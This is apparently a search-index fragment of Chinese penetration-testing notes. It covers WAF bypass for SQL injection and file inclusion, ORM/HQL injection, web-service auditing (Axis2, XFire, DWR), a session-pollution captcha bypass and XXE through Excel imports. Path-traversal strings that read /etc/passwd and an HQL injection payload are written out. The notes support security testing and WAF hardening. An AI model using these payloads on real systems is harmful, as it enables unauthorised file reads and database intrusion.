\u7684\u68c0\u6d4b\u3002 \u540c\u6837\uff0c\u51fd\u6570\u5206\u9694\u7b26\u601d\u60f3\u96c6\u548c\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7\u5173\u952e\u5b57from\u7684\u68c0\u6d4b\u3002 \u6700\u540e\u7a7a\u767d\u5206\u5206\u5272\u7ed5\u8fc7INFORMATION_SCHEMA.TABLES\u7684\u68c0\u67e5","title":"4.1. SQL\u6ce8\u5165\u7ed5\u8fc7"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#42","text":"\u6587\u4ef6\u5305\u542b\u5206\u4e3a\u76f8\u5bf9\u8def\u5f84\u3001\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u3002\u5728\u76f8\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u4e2d\uff0c\u6700\u7ec8\u6839\u636eLinux\u865a\u62df\u6587\u4ef6\u7cfb\u7edf(vfs)\u7684\u89c4\u5219\u67e5\u627e\u6587\u4ef6\uff0c\u901a\u8fc7\u5206\u6790vfs\u7684\u6587\u4ef6\u8def\u5f84\u89e3\u6790\u89c4\u5219\uff0c\u63d0\u53d6\u5176\u4e2d\u89c4\u5219\u7279\u70b9\uff0c\u7528\u8fd9\u4e9b\u7279\u70b9\u53bb\u7ed5\u8fc7WAF\u3002\u5728\u7edd\u5bf9\u6587\u4ef6\u8def\u5f84\u5305\u542b\u4e2d\uff0c\u4e3b\u8981\u662f\u6839\u636e\u653b\u51fb\u573a\u666f\uff0cWAF\u672a\u8fc7\u6ee4\u4e00\u4e9b\u534f\u8bae\u3001\u672a\u8fc7\u6ee4\u67d0\u4e9b\u7279\u6b8a\u8def\u5f84\u3002 \u76f8\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 \u5199WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u65f6\uff0c\u5982\u679c\u68c0\u6d4b\u5355\u4e00\u7684\u201d../\u201d\uff0c\u8bef\u62a5\u4f1a\u975e\u5e38\u591a\uff0c\u6240\u4ee5WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u901a\u5e38\u4f1a\u68c0\u6d4b\u8fde\u7eed\u7684\u201c../\"\u3002\u6839\u636evfs\u89e3\u6790\u8def\u5f84\u7684\u8bed\u6cd5\uff0c\u89e3\u6790\u5230\u201c//\u201d\u6587\u4ef6\u8def\u5f84\u4e0d\u53d8\uff0c\u89e3\u6790\u5230\u201c/./\u201d\u6587\u4ef6\u8def\u5f84\u4f9d\u7136\u3002 \u901a\u8fc7\u907f\u514d\u8fde\u7eed\u7684\"../\"\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u3002Eg: ././..///./.././/../etc//passwd\uff0c\u5b83\u7b49\u4ef7\u4e8e../../../etc/passwd \u7edd\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 WAF\u6ca1\u6709\u8003\u8651\u5230\u8def\u5f84\u4e2d\u63d2\u5165\u201c/./\u201d\u3001\u201c//\u201d\u5bf9\u4e8evfs\u89e3\u6790\u8def\u5f84\u662f\u7b49\u4ef7\u7684\uff0c\u5bfc\u81f4\u53ef\u88ab\u7ed5\u8fc7\u3002\u4f8b\u5982 /etc/./passwd \u4e0e /etc/passwd \u662f\u7b49\u4ef7\u7684\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7ec4\u5408\u201c/./\u201d\u3001\u201c//\u201d\u8fdb\u884c\u7ed5\u8fc7\uff0ceg. /etc///.//././/passwd\u3002 \u5bf9\u4e8e\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\uff0cWAF\u4e00\u822c\u4f1a\u62e6\u622a\u5e38\u89c1\u8def\u5f84\uff0c\u800c\u4e0d\u4f1a\u9632\u5fa1\u6240\u6709\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u56e0\u6b64\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u7684\u8def\u5f84\u4e0b\u4e00\u4e9b\u6587\u4ef6\uff0c\u4f8b\u5982/usr/local/nginx/conf/nginx.conf\u3002 \u5982\u679cWAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u68c0\u67e5\u5f00\u59cb\u8def\u5f84\u4e3aLinux\u7684\u76ee\u5f55\u540d\uff0c\u53ef\u4ee5\u91c7\u7528/wtt/../\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u68c0\u6d4b\u3002 \u4f8b\u5982\uff0c\u201c/wtt/../etc/passwd\u201d\uff0c wtt\u4e0d\u662fLinux\u6807\u51c6\u76ee\u5f55\uff0c\u4e0d\u4f1a\u88ab\u89c4\u5219\u5339\u914d\u3002WAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u4f46\u662f\u53ea\u4f7f\u7528\u4e00\u4e2a../\uff0c\u4e0d\u88ab\u62e6\u622a\u3002\u6700\u7ec8\u8bfb\u53d6/etc/passwd\u6587\u4ef6\u3002 \u5229\u7528WAF\u672a\u68c0\u6d4b\u7684\u534f\u8bae\u3002PHP \u6587\u4ef6\u5305\u542b\u652f\u6301\u7684\u534f\u8bae\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u770b\u73af\u5883\u9009\u62e9\u53ef\u884c\u7684\u65b9\u6cd5 file:// \u2014 Accessing local filesystem http:// \u2014 Accessing HTTP(s) URLs ftp:// \u2014 Accessing FTP(s) URLs php:// \u2014 Accessing various I/O streams zlib:// \u2014 Compression Streams data:// \u2014 Data (RFC 2397) glob:// \u2014 Find pathnames matching pattern phar:// \u2014 PHP Archive ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 Audio streams expect:// \u2014 Process Interaction Streams \u603b\u7ed3 \u4e00\u4e2a\u597dWAF\u4e0d\u662f\u5439\u51fa\u6765\u7684\uff0c\u662f\u5b9e\u8df5\u68c0\u9a8c\u51fa\u6765\u7684\u3002\u7814\u7a76WAF\u7684\u7ed5\u8fc7\u624b\u6bb5\uff0c\u662f\u4e3a\u4e86\u66f4\u597d\u7684\u63d0\u5347WAF\u7684\u9632\u5fa1\u80fd\u529b\u3002\u5728\u7814\u7a76\u7a81\u7834\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u8981\u4ec5\u4ec5\u505c\u7559\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u57fa\u672c\u6f0f\u6d1e\u539f\u7406\uff0c\u9700\u8981\u5bf9\u6d89\u53ca\u5e76\u6df1\u5165\u66f4\u591a\u7684\u9886\u57df\uff0c\u4f8b\u5982HTTP\u534f\u8bae\u7406\u89e3\u548cPHP\u3001Tomcat\u5bf9HTTP\u534f\u8bae\u6e90\u7801\u5206\u6790\uff0cMySQL\u8bcd\u6cd5\u5206\u6790\uff0c\u548cFuzz\u7684\u601d\u8def\u7b49\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u6709\u8bb8\u591a\u4e50\u8da3\uff0c\u4e5f\u4f1a\u6709\u5404\u65b9\u9762\u80fd\u529b\u7684\u63d0\u5347\u3002","title":"4.2.\u6587\u4ef6\u5305\u542b"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#3","text":"","title":"3.\u6846\u67b6\u5c42\u7684\u8bed\u53e5\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#jpql","text":"jpql\u4e0eSQL\u7684\u533a\u522b\u5c31\u662fSQL\u662f\u9762\u5411\u5bf9\u8c61\u5173\u7cfb\u6570\u636e\u5e93\uff0c\u4ed6\u64cd\u4f5c\u7684\u662f\u6570\u636e\u8868\u548c\u6570\u636e\u5217\uff0c\u800cjpql\u64cd\u4f5c\u7684\u5bf9\u8c61\u662f\u5b9e\u4f53\u5bf9\u8c61\u548c\u5b9e\u4f53\u5c5e\u6027 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 JPQL \uff09\uff1a SELECT e FROM user e WHERE e.id = SQL('(select 1 from dual where 1=1)\u2019) and SQL('(SELECT 1)=1\u2019) \u5b57\u7b26\u7c7b\u578b\uff08JPQL\uff09\uff1a \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165","title":"\u57fa\u4e8ejpql\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#hibernate","text":"ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 Hibernate ORM \uff09\uff1a test\\'' or 1<length((select version())) \u2013 \u7ffb\u8bd1\u6210\u4e3aHQL\u8bed\u53e5\u5c31\u53d8\u4e3a\uff1a SELECT p FROM pl.btbw.persistent.Post p where p.name='test\\'' or 1<length((select version())) \u2013 ' \u6700\u540e\u8f6c\u53d8\u4e3a\u771f\u6b63\u7684SQL\u8bed\u53e5\uff1a select post0_.id as id1_0_, post0_.name as name2_0_ from post post0_ where post0_.name=\u2018test\\'' or 1<length((select version())) -- ' \u8fd9\u6837\u6211\u4eec\u5c31\u4f1a\u9003\u9038\u51fa\u6765\u4e00\u4e2a\u8bed\u53e5\u6216\u8005\u65b9\u6cd5 \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165","title":"\u57fa\u4e8eHibernate\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#_4","text":"","title":"\u4e8c\u3001\u57fa\u4e8e\u4e09\u65b9\u8c03\u7528\u6846\u67b6\u5206\u6790\u5229\u7528"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#webservice","text":"1.\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e2.\u672a\u6388\u6743\u7684\u8bbf\u95ee3.\u81ea\u8eab\u672a\u4fee\u590d\u6f0f\u6d1eWEBSERVICE Jws\u6587\u4ef6\u5ba1\u8ba1 \u200b \u901a\u5e38\u800c\u8a00jws\u6587\u4ef6\u4e5f\u662faxis2\u53d1\u5e03\u7684\u4e00\u79cd\u8868\u73b0\u5f62\u5f0f\uff0c\u7136\u540e\u66f4\u591a\u7684\u88ab \u5ba1\u8ba1\u4eba\u5458\u5ffd\u7565 \u5728web\u76ee\u5f55\u5168\u5c40\u67e5\u627ejws\u7ed3\u5c3e\u7684\u6587\u4ef6 \u6839\u636e\u5bf9\u5e94\u7684web\u8bbf\u95ee\u76ee\u5f55\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee \u5bf9\u5176\u76f8\u5e94\u7684\u63a5\u53e3\u8fdb\u884c\u5ba1\u8ba1 SOAPMonitor \u7528\u6765\u8fdb\u884cwebservice\u7ba1\u7406\u53d1\u5e03\uff0c\u8c03\u8bd5\u7b49\u7b49\uff0c\u8fd9\u91cc\u9762\u5b58\u5728\u4e00\u4e2a\u53cd\u5e8f \u5217\u5316\u7684\u95ee\u9898 \u8bbf\u95ee\u6839\u8def\u5f84/SOAPMonitor , \u53f3\u952e\u6e90\u7801\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u914d\u7f6e\u9879 \u5185\u5bb9 \u8fdc\u7a0b\u8c03\u8bd5\u65f6\u5019\u5f00\u653e\u9ed8\u8ba45001\u7aef\u53e3\u8fdb\u884c\u5bf9\u8c61\u4f20\u8f93 \u5bfb\u627e\u5bf9\u5e94\u7684\u6267\u884c\u94fe\u6784\u9020payload\u8fdb\u884crec Axis2 \u5bf9\u4e8e\u6574\u4e2a\u9879\u76ee\u901a\u8fc7axis2\u6216\u8005axis\u53d1\u5e03\u7684\u670d\u52a1\uff0c\u4ece\u7edf\u8ba1\u7ecf\u9a8c\u4e0a\u6765\u8bb2\uff0c \u672a\u6388\u6743\u5927\u9762\u79ef\u5b58\u5728\uff0c\u800c\u4e14\u4f4e\u7248\u672c\u7684\u4ece\u5168\u5c40\u4e0a\u5c31\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u6f0f\u6d1e \u8bbf\u95ee\u5bf9\u5e94\u7684webservice\u8def\u5f84\uff0c\u6bd4\u5982/services/\u6216\u8005 /servlet/AxisServlet \u5bf9\u6240\u6709\u63a5\u53e3\u5bf9\u5e94\u7684\u7c7b\u8fdb\u884c\u5ba1\u8ba1\uff0c\u901a\u5e38\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u4e00\u4e00\u5bf9\u5e94 \u4f4e\u7248\u672c\u6784\u9020xxe payload\u53ef\u4ee5\u8fdb\u884c\u6f0f\u6d1e\u6d4b\u8bd5 Xfire Web\u53d1\u5e03\u5bb9\u5668\uff0c\u5df2\u7ecf\u505c\u6b62\u7ef4\u62a4\uff0c\u622a\u81f3\u5230\u6700\u540e\u4e00\u4e2a\u7248\u672c\uff0c\u5728 webservice\u4e0a\u8fd8\u662f\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u8bbf\u95ee\u6839\u8def\u5f84/services\uff0c\u66b4\u9732\u5bf9\u5e94\u7684webservices\u63a5\u53e3 \u6784\u9020payload\u5168\u5c40\u9020\u6210xml\u5b9e\u4f53\u6ce8\u5165","title":"WEBSERVICE\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#dwr","text":"\u5b9e\u9645\u7684\u7f51\u7ad9\u53d1\u5e03debug\u6a21\u5f0f\u662f\u5173\u95ed\u72b6\u6001\uff0c\u6211\u4eec\u505a\u9ed1\u76d2\u6d4b\u8bd5\u5c31\u8981\u53bb\u731c\u6d4b \u4e24\u4e2a\u9ed8\u8ba4\u76ee\u5f55,\u5206\u522b\u4e3a/exec/\u548c/dwr \u5ba1\u8ba1\u53ef\u4ee5\u5957\u7528\u5de6\u8fb9\u7684\u8bf7\u6c42\u5305\u7684\u6a21\u677f\uff0c\u5728\u4f60\u8ba4\u4e3a\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u6784\u9020 java\u63a5\u53e3\u8c03\u7528\u7684\u8bf7\u6c42\u6570\u636e\u5305 \u7f51\u7ad9\u53d1\u5e03dwr\u63a5\u53e3\uff0c\u901a\u5e38\u90fd\u662f\u672a\u6388\u6743\u8c03\u7528\uff0c\u5305\u542b\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u6bd4\u5982\u7528 \u6237\uff0c\u7ba1\u7406\u7b49api\u63a5\u53e3 \u5982\u679c\u53c2\u6570\u6784\u9020\u6709\u4e0d\u786e\u5b9a\u56e0\u7d20\uff0c\u53ef\u4ee5\u628a\u5bf9\u5e94\u7684dwr\u63a5\u53e3\u7a7a\u5b9e\u73b0\uff0c\u7136\u540e\u8f6c \u63a5\u5230\u6211\u4eec\u81ea\u5df1\u53ef\u4ee5\u672c\u5730\u6a21\u62df\u7684\u4ee3\u7801\u4e0a\u9762\u6765","title":"DWR\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#hessian","text":"","title":"HESSIAN\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#gwt","text":"","title":"GWT\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#sessionexc","text":"","title":"\u4e09\u3001\u8da3\u5473\u7684SESSION\u548cEXC"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#session","text":"\u573a\u666f\uff1a\u5728\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u65f6,\u5f88\u5e38\u89c1\u7684\u5199\u6cd5\u662f\u5148\u5c06\u9a8c\u8bc1\u7801\u5b58\u50a8\u4e8eSession\u5f53\u4e2d\uff0c\u5c06\u9a8c\u8bc1\u7801\u4f5c\u4e3a\u56fe\u7247\u6216\u662f\u624b\u673a\u9a8c\u8bc1\u7801,\u90ae\u7bb1\u7b49\u65b9\u5f0f\u53d1\u9001\u7ed9\u7528\u6237,\u5bf9\u5176\u8fdb\u884c\u8eab\u4efd\u7684\u9a8c\u8bc1. \u901a\u5e38\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4f1a\u5f88\u5bb9\u6613\u5f15\u53d1\u4e00\u4e2a\u95ee\u9898, \u8be5\u573a\u666f\u5e38\u89c1\u4e8ephp\u4e2d:\u7528\u6237A\u627e\u56de\u5bc6\u7801,\u9700\u8981\u8fdb\u884c\u624b\u673a\u6821\u9a8c\u7801\u7684\u6821\u9a8c,\u670d\u52a1\u5668\u628a\u53d1\u9001\u51fa\u53bb\u7684\u9a8c\u8bc1\u7801\u653e\u5728\u4e86Session\u4e2d,\u6b64\u65f6\u7528\u6237\u5fc5\u987b\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801\u624d\u80fd\u6210\u529f\u7684\u8fdb\u884c\u5bc6\u7801\u91cd\u7f6e \u573a\u666f: \u5728php\u4e2d,session\u4f7f\u7528\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8,\u5b83\u7684\u552f\u4e00\u6027\u4e0d\u662f\u5f88\u597d(\u591a\u4e2a\u5e94\u7528\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u4e2aSession) \u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51A\u4e0a\u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51B \uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u57df\u540d\u90fd\u89e3\u6790\u5230\u4e86\u540c\u4e00\u670d\u52a1\u5668\u4e0a,\u53ef\u80fd\u5c31\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u95ee\u9898 \u4f46\u662f\u5982\u679c\u5728\u6ca1\u53d1\u9001\u9a8c\u8bc1\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u4e48session\u4e2dcode\u4e3a\u7a7a,\u518d\u5c06\u8bf7\u6c42\u63d0\u4ea4\u7684\u9a8c\u8bc1\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4f7f\u7528php\u7684\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4false == false\uff0c\u5373\u6761\u4ef6\u4e3a\u771f\uff0c\u9a8c\u8bc1\u7801\u5339\u914d\u6210\u529f\uff0c \u51fa\u73b0\u8fd9\u4e00\u95ee\u9898\u7684\u539f\u56e0\u662f\u7531\u4e8e\u670d\u52a1\u5668\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406session\uff0c\u5728\u4f7f\u7528\u4e4b\u540e\u5fc5\u987b\u5bf9\u5176\u8fdb\u884c\u9500\u6bc1,\u5e76\u4e14\u9700\u8981\u5bf9session\u8fdb\u884c\u7a7a\u9a8c\u8bc1 \u5728\u672a\u767b\u5f55http://admin.test.com\u7684\u60c5\u51b5\u4e0b,\u901a\u8fc7\u5148\u8bbf\u95eehttp:// www.test.com/ demo\u7ad9\u70b9\u5bf9\u81ea\u5df1\u7684session\u8fdb\u884c\u4e00\u6b21\u8d4b\u503c,\u4f2a\u9020\u51fa\u8eab\u4efd \u90a3\u4e48\u8fd9\u4e2asession\u662f\u53ef\u4ee5\u88abhttp://admin.test.com\u8bbf\u95ee\u5230\u7684,\u6240\u4ee5\u9020\u6210\u7684\u6df7\u6dc6\u4f7f\u7528 \u5f15\u53d1\u5b89\u5168\u95ee\u9898","title":"SESSION\u6c61\u67d3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/#xxeexcel","text":"\u5e94\u7528\u573a\u666f\uff1a \u5728\u5f88\u591a\u7cfb\u7edf\uff0c\u4e0d\u7ba1\u662f\u540e\u53f0\u8fd8\u662f\u524d\u53f0\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u78b0\u5230\uff0c\u5bfc\u5165/\u5bfc \u51fa\u8fd9\u6837\u7684\u5b57\u6837\uff0c\u4ece\u7edf\u8ba1\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u767e\u5206\u4e4b\u516b\u5341\u4ee5\u4e0a\u90fd\u662fexcel\uff0c \u4f8b\u5982\uff0c\u5bfc\u5165\u4eba\u5458\u4fe1\u606f/\u5bfc\u51fa\u4eba\u5458\u4fe1\u606f\uff0c\u5f55\u5165\u7cfb\u7edf\u914d\u7f6e/\u5bfc\u51fa\u7cfb\u7edf\u914d \u7f6e\u7b49\u7b49 \u6280\u5de7\u53d8\u5f62\uff1a \u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u6211\u4eec\u662f\u4e0d\u9700\u8981\u53bb\u4fee\u6539workbook.xml\uff0c\u6709\u65f6\u5019\u6211 \u4eec\u60f3\u8981\u8fbe\u5230\u7684\u76ee\u7684\u5c31\u662f\uff0c\u5bfc\u51fa\u6765\u4e4b\u540e\uff0c\u7136\u540e\u6839\u636e\u683c\u5f0f\uff0c\u5916\u90e8\u5b9e\u4f53 \u5f15\u5165\uff0c\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\uff0c\u6bd4\u5982/etc/passwd\u7b49\uff0c\u53ef\u4ee5\u5728\u5bfc\u5165\u7684\u65f6\u5019 \u8fdb\u884c\u64cd\u4f5c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5e94\u8be5\u53bb\u4fee\u6539xl/worksheets/sheet1.xml \u8c03\u7528\u7684\u5b9e\u4f53 \u66ff\u6362\u6a21\u677f\u6570\u636e\u5373\u53ef\uff0c\u8fd9\u65f6\u5019\u5f53\u6211\u4eec\u5bfc\u5165\u65f6\u5019\uff0c\u5c31\u4f1a\u628a \u7cfb\u7edf\u654f\u611f\u6587\u4ef6\u8bfb\u53d6\u51fa\u6765","title":"XXE\u5728EXCEL\u4e2d\u7684\u5e94\u7528\u573a\u666f"}]}